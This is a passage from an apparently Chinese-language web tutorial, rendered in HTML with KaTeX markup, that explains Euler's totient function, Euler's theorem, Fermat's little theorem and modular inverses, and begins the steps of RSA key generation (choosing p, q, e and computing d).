<li><strong>如果n可以分解成两个互质的整数之积，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mn>1</mn><mo>×</mo><mi>p</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">n = p1 \times p2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span></span></span></span>；则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mn>1</mn><mo>×</mo><mi>p</mi><mn>2</mn><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n) = \varphi(p1 \times p2) = \varphi(p1) \times \varphi(p2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose">)</span></span></span></span>，即积的欧拉函数等于各个因子的欧拉函数之积。</strong></li>
</ol>
<h5 id="欧拉定理">欧拉定理<a class="header-anchor" href="#欧拉定理"> ¶ </a></h5>
<p>如果两个正整数a和n互质，则n的欧拉函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 可以让下面的等式成立：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>n</mi><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">a^{\varphi(n)} \equiv 1\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p>
<p>也就是说，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>次方除以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>的余数为1。</p>
<p><strong>费马小定理：</strong><br>
假设正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>与质数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>互质，因为质数p的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span> 等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，则欧拉定理可以写成</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>p</mi><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">a^{p-1} \equiv 1\pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></p>
<h5 id="模反元素">模反元素<a class="header-anchor" href="#模反元素"> ¶ </a></h5>
<p>如果两个正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>互质，那么一定可以找到整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>，使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ab-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">ab</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 被<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>整除，或者说<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">ab</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span></span></span></span>除以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>的余数是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>n</mi><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">ab \equiv 1\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>
这时候b就叫做a的&quot;模反元素&quot;。</p>
<p>而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mi>a</mi><mo>×</mo><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>n</mi><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">a^{\varphi(n)}=a\times a^{\varphi(n)-1}\equiv 1\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，可以得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">a^{\varphi(n)-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>的模反元素。</p>
<h4 id="公钥与私钥的产生">公钥与私钥的产生<a class="header-anchor" href="#公钥与私钥的产生"> ¶ </a></h4>
<ol>
<li>随机选择两个不相等大质数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">N = p \times q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li>
<li>根据欧拉函数，求得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>的欧拉函数： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (N)=\varphi (p)\varphi (q)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> [^rsa  公钥与私钥的产生-2]</li>
<li>选择一个小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span> 的整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>需满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>e</mi><mo>&lt;</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1&lt;e&lt;\varphi (N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span> 互质；实际应用中，常常选择<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65537</mn></mrow><annotation encoding="application/x-tex">65537</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">65537</span></span></span></span>）。并求得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span> 关于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span> 的模反元素，命名为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>，有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex">ed\equiv 1 \pmod {\varphi (N)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">))</span></span></span></span></li>
